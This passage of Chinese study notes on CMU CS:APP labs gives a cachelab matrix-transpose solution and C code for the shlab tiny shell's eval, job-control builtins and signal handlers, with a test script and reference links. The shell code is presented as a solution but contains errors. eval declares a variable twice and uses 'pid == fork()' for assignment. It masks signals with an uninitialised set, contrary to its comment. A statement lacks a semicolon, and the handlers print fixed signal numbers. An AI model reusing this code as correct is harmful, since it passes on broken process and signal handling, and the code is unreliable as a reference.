          tmp8 = B[m][i+7];
          
          B[m][i+4] = tmp1;
          B[m][i+5] = tmp2;
          B[m][i+6] = tmp3;
          B[m][i+7] = tmp4;

          B[m+4][i] = tmp5;
          B[m+4][i+1] = tmp6;
          B[m+4][i+2] = tmp7;
          B[m+4][i+3] = tmp8;
        }
        for(k = i + 4; k < i + 8; ++k)
        {
          tmp1 = A[k][j+4];
          tmp2 = A[k][j+5];
          tmp3 = A[k][j+6];
          tmp4 = A[k][j+7];

          B[j+4][k] = tmp1;
          B[j+5][k] = tmp2;
          B[j+6][k] = tmp3;
          B[j+7][k] = tmp4;
        }
      }   
    }
  }
```

### 61x67 ###
这个思路非常清晰如下
```c
else{
    for(i = 0; i < N; i+=17)
    {
      for(j = 0; j < M; j+=17)
      {
        for (int x = i; x < N && x < i + 17; ++x)
                      for (int y = j; y < M && y < j + 17; ++y) B[y][x] = A[x][y];
      }   
    }
  }
```
## lab7-shlab ##
[文件下载链接](https://link.zhihu.com/?target=http%3A//csapp.cs.cmu.edu/3e/shlab-handout.tar)
工作文件tsh.c
tsh支持的四个命令
1.quit
2.jobs
3.fg
4.bg
需要实现的函数有:
1.eval
2.builtin_cmd
3.do_bgfg
4.waitfg
5.sigchld_handler
6.sigint_handler
7sigtstp_handler
需要使用的相关内置信号函数有sigfillset/sigemptyset/sigaddset/sigprocmask/setpgid
用法参考:[链接](https://www.cnblogs.com/52php/p/5815125.html)
检查方法:
make然后使用****.sh脚本如下，接着对比文件就可以了
```sh
diff tshref.out tsh.out > diff.out
```
sh脚本
```sh
#!/bin/bash

list="test01 test02 test03 test04 test05 test06 test07 test08 test09 test10 test11 test12 test13 test14 test15 test16"

rm tsh.out

for task in $list
do
	make $task >> tsh.out
	echo "make $task done."
done
```

### eval ###
```c
    int parse_result;
    int state;
    pid_t pid;
    char *argv[MAXARGS];
    char buf[MAXLINE];
    int parse_result;
    
    strcpy(buf, cmdline);
    parse_result = parseline(buf, argv);
    if (argv[0] == NULL)
    {
        return;
    }

    sigset_t mask_all, mask_one, prev_one;
    sigfillset(&mask_all);//把信号集初始化包含所有已定义的信号
    sigemptyset(&mask_one);//将信号集初始化为空
    sigaddset(&mask_one, SIGCHLD);//把信号SIGCHLD添加到信号集mask_one中
    
    if (!builtin_cmd(argv))//判断内置命令
    {
        sigprocmask(SIG_SETMASK, &prev_one, NULL);//信号屏蔽字设为SIGCHLD，阻塞child，这里是为了防止导致条件竞争的信号阻塞
        if ((pid == fork()) == 0)
        {
            sigprocmask(SIG_SETMASK, &prev_one, NULL);//子进程继承了父进程的阻塞向量
            if (setpgid(0, 0) < 0)//这里重新设置了进程组号
	    //将使子进程放入一个新的进程组中，保证bash前台进程组中只有一个进程，即tsh进程。
            {
              unix_error("SETPGID error");
            }
            if (execve(argv[0], argv, environ) < 0)
                unix_error("EXECVE error");
        }

        state = parse_result ? BG : FG;//判断前台还是后台命令
        sigprocmask(SIG_BLOCK, &mask_all, NULL);//阻塞所有信号
        addjob(jobs, pid, state, cmdline);
        sigprocmask(SIG_SETMASK, &prev_one, NULL);

        if (!parse_result)
            waitfg(pid);
        else
            printf("[%d] (%d) %s", pid2jid(pid), pid, cmdline);

    }
```

### builtin_cmd ###
```c
if (!strcmp(argv[0],"quit"))
      exit(0);

    else if (!strcmp(argv[0],"jobs"))
      listjobs(jobs);

    else if (!strcmp(argv[0],"fg")  || !strcmp(argv[0],"bg"))
        do_bgfg(argv);

  else if (!strcmp(argv[0],"&"))
    {
        return 1;
    } 
    return 0;
```

### do_bgfg ###
```c
if (!strcmp(argv[0], "bg"))
    {
        sigset_t mask_all, prev_all;
        sigfillset(&mask_all);
        struct job_t* job;
        if (argv[1][0] == '%')//这里操作进程组
        {
            int jid = atoi(&argv[1][1]);
            sigprocmask(SIG_BLOCK, &mask_all, &prev_all);
            job = getjobjid(jobs, jid);
            sigprocmask(SIG_SETMASK, &prev_all, NULL);
        }
        else//这里操作进程
        {
            pid_t pid = atoi(argv[1]);
            sigprocmask(SIG_BLOCK, &mask_all, &prev_all);
            job = getjobpid(jobs, pid);
            sigprocmask(SIG_SETMASK, &prev_all, NULL);
        }
        if (kill(-job->pid, SIGCONT) < 0)
            unix_error("SIGCONT error");
        job->state = BG;
        printf("[%d] (%d) %s", job->jid, job->pid, job->cmdline)
    }
```

### waitfg ###
```c
sigset_t mask_empty;
    sigemptyset(&mask_empty);
    while (fgpid(jobs) > 0)
        sigsuspend(&mask_empty);//依次将前台运行的进程挂起
    return;
```

### sigchld_handler ###
```c
int olderrno = errno;
    int statusp;
    pid_t pid;
    sigset_t mask_all, prev_all;
    sigfillset(&mask_all);
    while ((pid = waitpid(-1, &statusp, WNOHANG | WUNTRACED)) > 0)
    {
        if (WIFEXITED(statusp))//正常退出
        {
            sigprocmask(SIG_BLOCK, &mask_all, &prev_all);
            deletejob(jobs, pid);
            sigprocmask(SIG_SETMASK, &prev_all, NULL);
        }
        else if (WIFSIGNALED(statusp))//子进程因为信号终止
        {
            sigprocmask(SIG_BLOCK, &mask_all, &prev_all);
            printf("Job [%d] (%d) terminated by signal %d\n",pid2jid(pid), pid, SIGINT);
            deletejob(jobs, pid);
            sigprocmask(SIG_SETMASK, &prev_all, NULL);
        }
        else {//停止状态
            sigprocmask(SIG_BLOCK, &mask_all, &prev_all);
            struct job_t* job = getjobpid(jobs, pid);
            job->state = ST;
            printf("Job [%d] (%d) stopped by signal %d\n", pid2jid(pid), pid, SIGTSTP);
            sigprocmask(SIG_SETMASK, &prev_all, NULL);
        }

    }
    errno = olderrno;
    return;
```

### sigint_handler 和 sigtstp_handler ###
```c
int olderrno=errno;
    pid_t pid=fgpid(jobs);
    if(pid!=0){
        kill(-pid,sig);
    }
    errno=olderrno;
    return;
```

## 参考资料 ##
1.[attachlab](https://blog.csdn.net/weixin_41256413/article/details/80463280)
2.[cachelab思路](https://zhuanlan.zhihu.com/p/456858668)
3.[cachelab思路](https://zhuanlan.zhihu.com/p/79058089)
4.[shelllab思路](https://blog.csdn.net/qq_42241839/article/details/123227742)
5.[shelllab-ref1](https://github.com/BillyoTry/learning-record/blob/main/Kernel%20basis/shlab.md)
6.[shelllab-ref2](https://blog.csdn.net/qq_42241839/article/details/123227742)
